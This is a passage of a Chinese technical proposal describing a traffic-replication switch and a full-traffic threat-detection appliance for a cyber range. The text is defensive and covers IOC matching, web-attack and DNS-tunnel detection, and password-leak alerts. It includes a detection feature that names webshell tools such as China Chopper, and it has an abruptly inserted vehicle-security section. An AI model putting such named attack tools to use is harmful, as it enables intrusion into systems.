id="采集数据流智能分发设备"><a href="#采集数据流智能分发设备" class="headerlink" title="采集数据流智能分发设备"></a>采集数据流智能分发设备</h4><h5 id="功能实施方案"><a href="#功能实施方案" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>该机架式盒式交换机设计为1U高度，具备专用于管理的2个端口、1个console端口以及1个USB端口。这种设计在满足高性能网络交换需求的同时，提供了灵活的管理和控制接口，使管理员能够方便地对设备进行配置和监控。其中，管理专用端口的数量和console端口的设置为设备的远程管理和本地调试提供了便利，USB端口的设计则支持一些外部设备的连接。</li><li>设备配置了24个千兆Base-T端口和4个万兆SFP+端口，满足了对不同速率网络连接的需求。千兆Base-T端口适用于传统的以太网连接，而万兆SFP+端口则为高速网络提供了更大的带宽，使得设备能够适应不同规模和性能要求的网络环境。</li><li>设备的关键部件，包括CPU和转发芯片，采用了龙芯的cpu和网讯的转发芯片，均属于国产产品。这一设计旨在提升设备的自主可控性和安全性，同时也支持了国内技术的发展。采用国产关键部件有助于确保设备在网络性能和可靠性方面的高水平表现。</li><li>支持基于端口的M:N流量复制功能以及基于流的M:N流量复制功能。这两种流量复制功能使管理员能够精确地配置网络流量的复制规则，以满足网络监测、分析和故障排查的需求。这为网络管理提供了更加灵活和精细的控制手段。</li><li>设备支持普通IPv4、IPv6报文五元组流分类功能和内层（VXLAN）IPv4、IPv6报文五元组流分类功能。这一功能使得设备能够根据报文五元组信息对网络流量进行分类，有助于进行精准的流量控制和管理。特别地，对于内层VXLAN报文的支持增强了对虚拟化网络的适应性，提高了设备在复杂网络环境中的应用范围。</li><li>支持基于Hash和轮询的报文分担功能，这意味着设备可以通过Hash算法或轮询机制，将网络流量分配到多个目的地端口上，以实现流量的均衡分担。这对于负载均衡和提高网络性能至关重要，特别是在大规模网络中，有效地利用带宽资源。</li><li>除了流量的分担功能外，还提供了多种报文处理功能，以满足网络管理的不同需求。其中包括报文截断，允许管理员设定报文的截断长度，以适应特定的网络场景。增加时间戳和以太网头部功能可在报文中添加时间信息或以太网头部信息，为网络分析和调试提供更多上下文。增加源端口标识功能可在报文头部添加源端口标识，便于追踪流量来源。修改报文头部功能则提供了更灵活的报文定制选项，可根据需求修改报文头部的相关字段。最后，剥离隧道功能允许设备剥离报文中的隧道封装，以便进行进一步的处理或分析。</li></ol><h5 id="性能实施方案"><a href="#性能实施方案" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li>该设备具备出色的网络性能，其吞吐能力达到1.92Tbps，转发能力达到每秒1260M个数据包（Mpps）。吞吐能力反映了网络设备在单位时间内能够处理的总数据量，而转发能力则表示其每秒能够处理的数据包数量。这样高的性能指标意味着设备可以在高负载、高流量的网络环境下表现出色，保证了网络的流畅运行。</li><li>在电源和散热方面，该设备配置了2个交流电源，为设备提供了电力冗余，提高了系统的可靠性和稳定性。此外，设备采用了4个可插拔模块化风扇，这些风扇模块不仅可进行热插拔，还有助于保持设备的良好散热，确保在设备长时间运行时维持适宜的工作温度。并配备有24个万兆多模光模块。</li></ol><h5 id="技术实现内容"><a href="#技术实现内容" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>功能参数设计为，机架式盒式交换机具备高度1U，拥有管理专用端口2个，console 1个，USB端口1个。配置24个千兆Base-T端口和4个万兆SFP+端口，采用国产关键部件（CPU、转发芯片）。支持端口和流基的M:N流量复制功能，IPv4/IPv6报文流分类功能，内层（VXLAN）报文流分类功能。提供基于Hash、轮询的报文分担功能，报文截断、增加时间戳、源端口标识、修改报文头部、剥离隧道等功能。</p><p>性能参数设计为，吞吐能力1.92Tbps，转发能力1260Mpps。配置2个交流电源，4个可插拔模块化风扇，24个万兆多模光模块。</p><p>设备选择：选择高度为1U的机架式盒式交换机，具备所需的管理专用端口、console端口和USB端口，其中包含两个管理专用端口。设备配置有24个千兆Base-T端口和4个万兆SFP+端口。设备关键部件采用国产化，包括CPU和转发芯片。以支持国产产业发展，提高系统的可靠性和安全性</p><p>功能支持：采集数据流智能分发设备支持内层（VXLAN）IPv4报文功能、支持剥离隧道功能、修改报文头部功能、支持普通IPv4、IPv6报文五元组流分类功能、增加源端口标识、IPv6报文五元组流分类功能、支持报文截断、基于端口和基于流的M:N流量复制功能、增加时间戳和以太网头部功能以及基于Hash和轮询的报文分担功能等功能。</p><p>性能支持：采集数据流智能分发设备的数据流处理速度1.92Tbps。设备的数据包转发速率1260Mpps。设备具备快速的数据包转发能力，能够支持高并发的网络流量传输</p><p>电源和风扇：采集数据流智能分发设备配置2个交流电源，以确保系统的可靠性和冗余性。拥有4个可插拔模块化风扇，以保证设备的散热性。</p><p>光模块：采集数据流智能分发设备配置24个万兆多模光模块，以满足连接需求。</p><h4 id="靶场定制全流量威胁检测"><a href="#靶场定制全流量威胁检测" class="headerlink" title="靶场定制全流量威胁检测"></a>靶场定制全流量威胁检测</h4><h5 id="功能实施方案-1"><a href="#功能实施方案-1" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li><p>该流量采集设备具备出色的性能，支持1Gb的流量采集。配置了2个GE流量监听电口、2个10GE流量监听光口、2个GE管理电口、以及1个DB9 Console接口，满足了多样化的网络接入和管理需求。此外，该设备还配备了20TB的SATA硬盘作为存储介质，可满足非常高效地进行存储采集到的网络流量数据及其他存储内容。</p></li><li><p>该设备在流量分析方面表现卓越，支持对常见协议的识别和还原，涵盖了HTTP、DNS、SMTP、POP3、IMAP、Webmail、DB2、Oracle、MySQL、SQL Server、Sybase、SMB、FTP、SNMP、Telnet、NFS、ICMP、SSL、SSH等多种协议。这使得设备在取证分析和威胁发现等方面具备了强大的分析能力，能够深入挖掘网络流量中的关键信息。</p></li><li><p>该设备支持对流量中的文件传输行为进行发现和还原，能够记录文件的MD5并发送至分析设备。支持的文件类型包括可执行文件（EXE、DLL、OCX、SYS、COM、APK、BIN等）、压缩格式文件（RAR、ZIP、GZ、7Z、TAR等）、文档类型文件（Word、Excel、PDF、RTF、PPT、TXT等）、多媒体文件（Flash、JPG、JPEG、PNG、FLV、SWF等）、脚本文件（HTML、HTM、Java、MHTML、MHT等），能够实现上述文件的发现和还原，为网络安全分析提供了全面的支持。</p></li><li><p>该设备能够识别或还原常见数据库协议，包括DB2、Oracle、SQL Server、MySQL、PostgreSQL等协议。这对于监测和分析数据库相关的流量行为，如数据库访问和查询等，提供了强大的支持。</p></li><li><p>基于协议的深度识别和还原，能够对相关网络行为进行识别，该设备还支持TCP/UDP会话记录、异常流量会话记录、Web访问记录、域名解析、SQL访问记录、邮件行为、登录情况、文件传输、FTP控制通道、SSL加密协商、Telnet行为、IM通信等多种行为描述。这有助于网络管理员全面了解网络活动，及时发现异常行为并采取必要的安全措施。</p></li><li><p>该流量采集设备具备灵活的自定义协议和端口功能，可以满足特殊场景下的流量抓取需求。同时，设备支持基于流量的实时IOC匹配功能，内置了主流的IOC（Indicator of Compromise，威胁指标）数据库，总量达到50+万条。这保证了设备在实时流量分析中能够及时发现并匹配出潜在的安全威胁。</p></li><li><p>设备在WEB应用攻击检测方面表现卓越，支持检测多种注入型攻击，如SQL注入、XSS（跨站脚本攻击）以及系统配置等注入型攻击。此外，还支持跨站请求伪造（CSRF）攻击的检测。这些功能有助于防范和及时发现针对WEB应用的常见攻击手法，提高网络安全的整体水平。</p></li><li><p>除了注入型攻击，该设备还支持检测其他类型的WEB攻击，包括目录遍历、弱口令、权限绕过、信息泄露、文件包含、文件写入等多种攻击方式的检测。这些功能使得设备能够全面覆盖WEB应用层面的威胁，为网络管理员提供全面的安全保护。</p></li><li><p>设备在流量层面强化了IOC匹配功能，在流量采集分析时实时匹配IOC情报数据，形成情报关联分析数据，内置主流的IOC数据库，情报总量高达370+万条。这使得设备在实时匹配流量中更加准确地识别潜在的威胁，提供了更为全面的网络安全防护。</p></li><li><p>该设备还支持基于工具特征的WEBSHELL检测，能够通过系统调用、系统配置和文件操作等多方面维度来及时发现威胁。具体而言，设备能够检测出像中国菜刀、小马上传工具、小马生成器等常见的WEB攻击工具特征，进一步提高了设备的检测精度和实用性。</p></li><li><p>该流量采集设备支持基于代理程序的攻击检测，包括TCP代理程序、HTTP代理程序等。这些代理程序通常是恶意攻击中常见的手段，通过对其进行检测，设备能够有效防范和发现使用代理程序进行的攻击，提升网络的安全性。</p></li><li><p>设备提供多种攻击检测功能，能够更全面地从流量中发现各类威胁。其中包括对协议异常、网络欺骗、黑市攻击以及代码执行等威胁的检测。这些功能使得设备能够覆盖更广泛的威胁场景，为网络安全提供全方位的保护。</p></li><li><p>该设备对多种协议的流量进行文件还原，涵盖了HTTP、FTP_DATA、SMB、SMTP、POP3、WEBMAIL、IMAP、TFTP、QQ、NFS等类型协议。这意味着在网络分析和取证分析时，管理员可以对各类协议的流量中的文件进行还原和检查，以便更好地了解网络中的活动和潜在风险。</p></li><li><p>设备支持通过抓包对流量进行详细分析。管理员可以定义抓包流量的双向或单向、数量、IP地址、端口或协议类型等参数，以灵活地满足特定的抓包需求。这使得管理员能够根据具体情况深入分析流量，寻找异常和威胁迹象。</p></li><li><p>设备支持基于网络请求的语义分析检测，能够将网络请求拆分后从请求头、响应头、请求体、响应体四方面详细展示请求内容。这种语义分析能力使得设备更具智能，能够提升对未知威胁的检测能力，进一步加强了网络的安全防护。</p></li><li><p>该设备提供强大的自定义弱口令字典功能，覆盖了HTTP、HTTPS、Telnet、FTP、POP、SMTP、IMAP等多种协议，允许管理员根据实际需求自定义弱口令检测规则。这使得系统能够高效地检测和应对各种常见协议的弱口令问题，有效提升了网络安全的整体水平。</p></li><li><p>设备支持旁路HTTPS解密和威胁检测功能，通过对HTTPS流量的解密，系统能够深入分析加密流量中的潜在威胁，有力应对了一些隐蔽性高的网络攻击手段，为网络安全提供了更全面的保障。</p></li><li><p>为确保数据在传输过程中的安全性，该设备支持高级加密标准AES256和SM4等数据传输加密算法。这样的加密手段不仅保障了通信数据的机密性，同时也对抵御各类网络攻击提供了有力的支持。</p></li><li><p>设备具备威胁告警信息发送功能，可将威胁告警、威胁等级、网络日志、攻击结果、威胁类型等详细信息发送至syslog服务器。同时，系统支持将这些日志信息传输至KAFKA，以满足对日志数据的更多处理需求，为安全事件的分析提供更多可能性。</p></li><li><p>该设备支持与云端威胁情报中心联动，管理员可通过一键搜索对受害IP、攻击IP、IOC/规则ID、文件MD5等信息进行快速查询。能够查看基本信息、开源情报、相关样本、可视化分析、域名解析、注册信息、关联域名、数字证书等多维度信息，为威胁情报的深度分析提供了强大的支持。</p></li><li><p>设备支持告警的深度行为分析，系统能够对各种网络行为进行深入剖析，包括DNS解析行为、TCP/UDP交互行为、WEB访问行为以及传输文件行为等。通过对这些行为的全面分析，系统能够更准确地判断网络中的潜在威胁，为管理员提供更精细化的安全警报。</p></li><li><p>为了提高对加密流量的威胁检测能力，该设备支持旁路HTTPS解密和威胁检测。通过解密HTTPS流量，系统能够深度检测加密通信中的威胁行为，包括各种高级攻击手段，从而提高网络威胁的可检测性。</p></li><li><p>设备支持AES256和SM4等高级数据传输加密算法，确保传输过程中数据的安全性。这为敏感信息的传输提供了可靠的保护，有效防范数据在传输过程中的遭受恶意攻击和窃取风险。</p></li><li><p>该设备支持以受害资产维度进行深度分析，包括失陷状态、受到的攻击类型、威胁级别、处于的攻击阶段以及所属的资产分组等。这种基于资产维度的分析，有助于管理员更好地了解网络中的潜在风险，迅速采取措施进行应对。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e5c98d4badd8e1c39004c9bf595cac28.png"></p></li><li><p>该设备支持以攻击者的维度进行分析，对攻击者进行全方位的画像。画像内容包括地理位置信息、国家信息、所属组织、使用的攻击手段以及攻击的所有资产等。通过这种分析，管理员能够更好地理解攻击者的行为和特征，有助于加强对潜在攻击者的追踪和应对。</p></li><li><p>设备提供了全面的应用系统安全检测功能，涵盖了WEB安全、数据库安全、中间件安全和邮件安全等多个维度。在WEB安全方面，系统能够监测和防范常见的WEB攻击，如SQL注入、跨站脚本（XSS）等，以确保Web应用程序的安全性。对于数据库、中间件和邮件安全，设备通过深度审计和监测，可及时发现和应对各种应用层面的潜在威胁和攻击。截图见产品功能截图</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/499270f45e3d15382f8478c39d57f53f.png"></p><ol><li>在系统安全方面，设备将安全性进一步划分为多个细分维度，包括暴力破解、弱口令、未授权访问和挖矿行为等。这意味着系统能够更精确地识别和定位各种系统层面的安全威胁，提供更有针对性的安全防护。</li><li>设备具备对可疑DNS解析的高效检测能力，能够发现DGA域名（使用域名生成算法生成的域名）和DNS隧道域名。管理员可以根据时间范围、请求次数、DNS域名总长度等参数自定义检测规则，以增强对DNS隧道威胁的感知和应对能力。</li><li>该设备支持检测疑似DNS服务器的发现，通过对响应DNS请求与发起DNS请求的行为进行分类，系统可以更准确地识别可能存在的DNS服务器发现行为，提高网络对潜在威胁的感知水平。</li><li>在DNS重绑定分析方面，设备提供了详细的信息展示，包括受害IP、攻击IP、域名、DNS解析记录和访问时间等。这些信息有助于管理员全面了解DNS重绑定攻击的具体情况，为采取及时的防范和应对措施提供了有力支持。</li><li>设备具备强大的异常登录行为检测功能，能够深入监测用户登录过程中的异常行为。具体而言，系统会记录并分析登录事件的源IP地址、登录账号、登录资产IP、使用的协议，以及登录结果等关键信息。此外，管理员还拥有配置异常登录行为检测的时间范围的灵活性，可以根据需要调整时间窗口，确保对异常登录行为的监测是实时、准确的。截图见产品功能截图</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d547d4a993c5d464d00fe614dc1698c3.png"></p><ol><li>明文密码泄露行为检测是设备的一项重要安全功能。系统能够全方位地监测登录账号IP、账号、密码以及使用的协议等关键信息，从而有效预防因明文密码泄露引起的潜在安全威胁。管理员可以随时获取有关明文密码泄露事件的详细信息，以便及时采取必要的响应措施。截图见产品功能截图</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fcf55d1d86630b29d48f2fc49c6397dc.png"></p><ol><li>设备提供了对多种常见数据库高危操作行为的深度分析。支持的数据库类型包括MySQL、MSSQL、Oracle、Sybase等。管理员可以通过设备自定义规则，以更加细致的方式识别和记录高危数据库操作行为，从而更好地保障数据库的安全性。截图见产品功能截图</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f8b81e31ebf91eb80f068b5e31fae004.png" alt="1705431808249"></p><ol><li>可疑来源访问行为分析功能允许管理员全面了解访问行为的细节，包括访问来源、源IP、资产IP、资产组、源地域、目的端口、URI等多方面的信息。此外，管理员还可以根据具体需求自定义可疑来源，使系统更灵活地适应不同的网络环境，加强对潜在威胁的感知和识别。通过这一功能，系统不仅可以有效检测可疑访问，还能帮助管理员迅速做出相应的安全决策。截图见产品功能截图</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c556cae71b2529658b842e537c0241a.png"></p><ol><li><p>设备具备强大的云端众测平台漏洞情报及资产漏洞信息配置和展示功能。管理员可以轻松地配置设备以展示来自云端众测平台的漏洞情报和资产漏洞信息。这使得管理员能够在设备上直观地查看并分析云端众测平台提供的最新漏洞信息，为网络安全决策提供有力支持。通过及时获取云端众测平台的信息，系统不仅可以更全面地评估资产的风险状况，还能够提前发现和防范潜在的漏洞威胁。</p></li><li><p>设备提供了直观且全面的大屏展示功能，旨在呈现整体资产风险态势。通过资产矩形树结构、资产分类、资产概况、开放服务统计以及资产风险状态等多维度信息的展示，管理员可以一目了然地了解网络中各类资产的安全状态。这种整体资产风险态势的展示不仅有助于迅速定位网络中存在的潜在威胁，还提供了直观的数据支持，帮助管理员制定更有效的网络安全策略。通过大屏展示，管理员可以更加方便地监控网络安全状况，做出及时的决策和应对措施。截图见产品功能截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6472dc85c1dbedcc909a9bb1b63a329a.png"></p></li></ol><h5 id="技术实现内容-1"><a href="#技术实现内容-1" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>功能参数设计为，流量采集性能为1Gb。配置有2个GE流量监听电口、2个10GE流量监听光口、2个GE管理电口、1个DB9 Console接口，20TB SATA存储硬盘。支持常见协议识别与还原，包括http、dns等。对流量中文件传输行为进行发现和还原，并记录文件MD5。</p><p>支持常见数据库协议识别与还原。记录TCP/UDP会话、异常流量会话、web访问等行为描述。支持自定义协议和端口，流量实时IOC匹配功能。检测WEB应用攻击，包括SQL注入、XSS等。支持其他WEB攻击检测。流量实时IOC匹配功能，总情报量370+万条。支持基于工具特征的WEBSHELL检测。多种攻击检测。支持文件还原，抓包分析。支持语义分析检测。自定义弱口令字典。旁路HTTPS解密、威胁检测。AES256、SM4数据传输加密。</p><p>支持威胁告警信息发送。云端威胁情报中心联动。告警深度行为分析。支持以受害资产维度和攻击者维度进行分析。应用系统安全检测。系统安全细分维度。支持DNS解析、疑似DNS服务器发现、DNS重绑定分析。异常登录行为检测。明文密码泄露行为检测。常见数据库高危操作行为分析。可疑来源访问行为分析。</p><p>展示云端众测平台漏洞情报及资产漏洞信息。大屏展示整体资产风险态势。</p><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p>随着智能汽车技术的发展，车载网络安全成为车辆信息系统中不可忽视的一环。为了保障智能汽车系统的安全性，需要对车载网络进行实时的监控和分析，以便能够及时发现并响应安全事件。本系统旨在提供一套完整的解决方案，用于智能汽车网络的安全事件检测、流量分析和威胁情报处理。</p><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6><p>流量采集与监听</p><p>流量采集性能：1Gb，包含多种流量监听接口和存储能力。</p><p>协议识别与还原</p><p>协议识别：支持常见协议的识别与网络流量还原，用于取证分析和威胁发现。</p><p>文件传输行为分析</p><p>文件传输检测：支持对流量中的文件传输行为进行发现、还原，并记录文件MD5。</p><p>数据库协议识别</p><p>数据库协议识别：支持常见数据库协议的识别和还原。</p><p>行为记录</p><p>行为描述记录：支持记录TCP/UDP会话、异常流量、Web访问等多种行为。</p><p>自定义协议与IOC匹配</p><p>自定义协议：支持自定义协议和端口配置，以及实时IOC匹配功能。</p><p>WEB应用攻击检测</p><p>WEB攻击检测：支持检测SQL注入、XSS、CSRF等WEB应用攻击。</p><p>文件还原</p><p>协议流量文件还原：支持对多种协议的流量进行文件还原。</p><p>抓包分析</p><p>抓包分析：支持对流量进行抓包分析，可自定义抓包参数。</p><p>语义分析检测</p><p>语义分析：支持基于网络请求的语义分析检测。</p><p>弱口令检测</p><p>弱口令字典：支持自定义弱口令字典和相关协议的弱口令检测。</p><p>HTTPS解密与威胁检测</p><p>HTTPS解密：支持旁路HTTPS解密和威胁检测。</p><p>数据传输加密</p><p>数据传输加密：支持AES256、SM4等加密算法保障数据安全。</p><p>威胁情报与联动</p><p>云端威胁情报：支持与云端威胁情报中心联动。</p><p>行为分析</p><p>深度行为分析：支持DNS解析、TCP/UDP交互、WEB访问等行为分析。</p><p>分析维度</p><p>受害资产分析：支持以受害资产和攻击者维度进行分析。</p><p>安全检测</p><p>应用系统安全检测：支持WEB、数据库、中间件、邮件等安全检测。</p><p>DNS分析</p><p>DNS解析检测：支持可疑DNS解析和DNS服务器发现分析。</p><p>登录与密码泄露检测</p><p>异常登录检测：支持检测明文密码泄露和异常登录行为。</p><p>数据库高危操作分析</p><p>数据库操作分析：支持对常见数据库高危操作的行为分析。</p><p>可疑来源分析</p><p>可疑来源分析：支持可疑来源访问行为的分析。</p><p>漏洞信息与态势展示</p><p>漏洞信息展示：支持配置展示云端众测平台漏洞情报及资产漏洞信息。</p><p>资产风险态势：支持大屏展示整体资产风险态势。</p><h6 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h6><p>流量采集模块</p><p>负责从网络中采集流量，并进行初步的分类和存储。</p><p>协议分析模块</p><p>对采集到的流量进行深度协议分析，实现数据还原和行为记录。</p><p>威胁检测模块</p><p>根据已知的攻击模式和IOC，对流量进行分析，识别潜在的威胁。</p><p>行为分析模块</p><p>对网络行为进行深度分析，包括DNS解析、文件传输、登录行为等。</p><p>加密与解密模块</p><p>对流量进行加密传输，并在需要时进行解密处理。</p><p>威胁情报管理模块</p><p>与云端威胁情报中心联动，管理和应用威胁情报。</p><p>可视化与报告模块</p><p>提供用户界面，展示威胁检测结果和网络安全态势。</p><p>数据管理与同步模块</p><p>管理采集到的数据，支持与其他系统的数据同步。</p><h6 id="技术实施"><a href="#技术实施" class="headerlink" title="技术实施"></a>技术实施</h6><p>高性能处理：系统应能处理高速网络流量并保持低延迟。</p><p>准确性：协议识别和威胁检测需要高准确率。</p><p>易用性：系统应提供直观的用户界面和报告。</p><p>可扩展性：系统支持新增的威胁情报和自定义规则。</p><p>本方案提供了一个全面的智能汽车网络安全事件检测与流量分析解决方案，涵盖了从流量采集到威胁分析的完整流程。通过实施本方案，能够有效提升智能汽车网络的安全防护能力，及时发现并响应安全威胁，保障车载网络环境的安全稳定。</p><h5 id="方案简介"><a href="#方案简介" class="headerlink" title="方案简介"></a>方案简介</h5><p>设备选择：靶场定制全流量威胁检测设备是一台高性能的流量采集设备，其流量采集性能不低于1Gb。设备配置有1个DB9 Console接口、2个10千兆以太网流量监听光口、2个千兆以太网流量监听电口、2个千兆以太网管理电口。此外，设备还搭载了20TB SATA存储硬盘，并且支持扩容，以满足对大容量数据存储的需求。</p><p>功能支持：靶场定制全流量威胁检测设备支持对常见协议的识别与还原，包括但不限于FTP协议、SNMP协议、Telnet协议、NFS协议、ICMP协议、SSL协议、SSH协议、HTTP协议、DNS协议、SMTP协议、POP3协议、IMAP协议、Webmail协议、DB2协议、Oracle协议、MySQL协议、SQL Server协议、Sybase协议以及SMB协议等。可以通过对流量进行解析，能够还原出协议的具体内容，方便后续的取证分析和威胁发现。</p><p>文件传输行为进行发现和还原：记录文件的MD5值，以便后续的分析和对比。支持的文件类型应包括可执行文件包括但不限于EXE文件、DLL文件、OCX文件、SYS文件、COM文件、APK文件、BIN文件等、压缩格式文件包括但不限于RAR文件、ZIP文件、GZ文件、7Z文件、TAR文件等、文档类型文件包括但不限于Word文件、Excel文件、PDF文件、RTF文件、PPT文件、TXT文件等、多媒体文件包括但不限于Flash文件、JPG文件、JPEG文件、PNG文件、FLV文件、SWF文件等、脚本文件包括但不限于HTML文件、HTM文件、Java文件、MHTML文件、MHT文件等。</p><p>数据库协议解析：支持常见数据库协议包括但不限于DB2数据库协议、Oracle数据库协议、SQL Server数据库协议、MySQL数据库协议、PostgreSQL数据库协议的识别或还原。通过解析数据库协议的流量，能够还原出具体的数据库操作，方便进行数据库安全分析和威胁检测。</p><p>流量威胁检测：并提供详细的行为描述。支持的检测内容包括IM通信、Telnet行为、FTP控制通道、异常流量会话记录、SSL加密协商、Web访问记录、登录情况、TCP/UDP会话记录、邮件行为、域名解析、SQL访问记录以及文件传输等。通过对流量中的行为进行描述，能够帮助使用者更好地理解和分析威胁事件。</p><p>自定义功能：靶场定制全流量威胁检测设备支持自定义协议和端口，以满足特殊场景下的流量抓取需求。这使的设备可以适应不同网络环境和应用场景的需求，提高系统的灵活性和适应性。此外，还拥有基于流量的实时IOC匹配功能，情报总量不低于50万条，且包含具备主流的IOC。通过实时匹配IOC，能够及时发现已知的威胁，提高威胁检测的准确性和及时性。</p><p>攻击检测与分析功能：靶场定制全流量威胁检测设备支持检测针对WEB应用的攻击，涵盖了跨站请求伪造CSRF攻击、注入型攻击如系统配置注入、XSS注入、SQL注入攻击检测。通过对流量中的攻击行为进行检测和分析，能够及时发现并阻止潜在的攻击行为。</p><p>靶场定制全流量威胁检测设备支持检测如文件写入、文件包含、信息泄露、权限绕过、弱口令、目录遍历攻击等。能够全面覆盖各种WEB攻击场景，提高系统的安全性和防护能力。还可以进行其他攻击检测，例如代码执行、黑市攻击、协议异常、网络欺骗等。</p><p>能够根据文件相关的操作、修改系统配置、进行系统调用等方式及时发现威胁，如小马生成器、小马上传工具、中国菜刀等。可以及时发现并阻止恶意工具的使用，保护系统的安全。并且支持基于代理程序的攻击检测，如HTTP代理程序、TCP代理程序等。通过对代理程序的行为进行分析，能够发现并阻止代理程序的恶意行为。以下是基于基于工具特征的WEBSHELL检测截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/050f182aff97588cbe0135d560a05166.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/23f23f493334aae278bf388ec9addfb3.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7c775f702b08bac8cc9e7fe5550e9e5e.png"></p><p>数据分析与还原功能：靶场定制全流量威胁检测设备支持对NFS协议、QQ协议、HTTP协议、IMAP协议、FTP_DATA协议、SMB协议、POP3协议、SMTP协议、TFTP协议以及WEBMAIL协议的流量进行文件还原，帮助分析人员更好地理解和分析威胁事件，进一步提高威胁检测的准确性和效率。</p><p>流量抓包分析：为了能够根据具体的需求进行抓包分析，提高分析的针对性和有效性，能够自行选择需要的协议类型、端口或IP地址、数量、单向或双向。</p><p>基于网络请求的语义分析检测：通过对网络请求的语义进行分析，能够更准确地判断是否存在恶意行为。且能够从流量中获取响应体、请求体、响应头、请求头四方面详细展示请求内容，并能提升对未知威胁的检测能力。</p><p>告警及传输功能：靶场定制全流量威胁检测设备支持自定义弱口令字典，能够检测IMAP协议、SMTP协议、FTP协议、HTTP协议、Telnet协议、HTTPS协议以及POP协议的自定义弱口令。通过对弱口令的检测，能够及时发现并阻止潜在的安全风险。支持旁路HTTPS解密与威胁检测，通过对HTTPS流量的解密和分析，能够发现潜在的威胁并提供相应的防护措施。支持AES256、SM4数据传输加密。通过对数据传输进行加密，能够防止数据被篡改或泄露，保护系统的安全。</p><p>威胁告警：支持将信息发送给syslog服务器以及kafka服务器，日志信息包括威胁类型、攻击结果、网络日志、威胁告警、威胁等级等。具备集中管理和分析威胁事件的能力，并及时采取相应的防护措施，使传输方式更为多样。</p><p>与云端威胁情报中心联动：靶场定制全流量威胁检测设备支持与云端威胁情报中心联动，能够对文件MD5、IOC/规则ID、攻击IP以及受害IP进行一键搜索，并可通过查看数字证书、域名解析、可视化分析、文件MD5、IOC/规则ID、攻击IP、受害IP以及一键搜索等。通过与云端威胁情报中心的联动，能够及时获取最新的威胁情报，提高威胁检测的准确性和效果。</p><p>还支持对资产漏洞信息以及云端众测平台漏洞情报进行配置展示。以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ebd1f4d9253c1564951e22bcc29023b3.png" alt="表格 描述已自动生成"></p><p>大屏展示与资产分析：靶场定制全流量威胁检测设备支持采用大屏展示整体资产风险态势，包括资产矩形树结构、资产分类、资产概况、开放服务统计、资产风险状态。通过大屏展示，能够全面了解和分析系统的资产状况，及时发现并解决潜在的安全风险。以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6472dc85c1dbedcc909a9bb1b63a329a.png"></p><p>攻击者的维度进行分析：通过对攻击者的分析，能够更好地了解威胁的来源和特征，提高威胁检测的准确性和效率。攻击者进行画像包括：</p><ol><li>地理位置信息</li><li>国家信息</li><li>所属组织</li><li>使用的攻击手段</li><li>攻击的所有资产</li></ol><p>应用系统进行安全检测：通过对应用系统的安全检测，能够发现并修复潜在的安全漏洞和安全威胁，提高系统的安全性。包括的类型有：</p><ol><li>WEB安全</li><li>数据库安全</li><li>中间件安全</li><li>邮件安全</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/240779b180c4717501d5a1143732367e.png"></p><p>DNS相关功能：能够通过自定义域名总长度、请求次数以及时间范围来DNS隧道检测规则。通过对可疑DNS解析的检测，能够发现并阻止潜在的恶意域名的使用，提高系统的安全性。并且能够发现DGA域名与DNS隧道域名。</p><p>疑似DNS服务器发现：通过对DNS服务器的行为进行分析，能够发现并阻止潜在的DNS服务器的使用，提高系统的安全性。可以通过发起DNS请求以及响应DNS请求进行行为分类。</p><p>DNS重绑定分析：支持呈现访问时间、DNS解析记录、域名、攻击IP、受害IP等内容。通过对DNS重绑定的分析，能够发现并阻止潜在的DNS重绑定攻击，提高系统的安全性。</p><p>异常登录行为检测：靶场定制全流量威胁检测设备支持检测异常登录行为，能进行异常时间配置并包括信息：</p><ol><li>源IP</li><li>账号</li><li>登录资产IP</li><li>使用协议</li><li>登录结果</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c9a9a04e95447b30a98f559b8c57f9f.png"></p><p>明文密码泄露行为检测：靶场定制全流量威胁检测设备支持检测明文密码泄露行为，包括信息：</p><ol><li>登录账号IP</li><li>账号</li><li>密码</li><li>使用协议</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 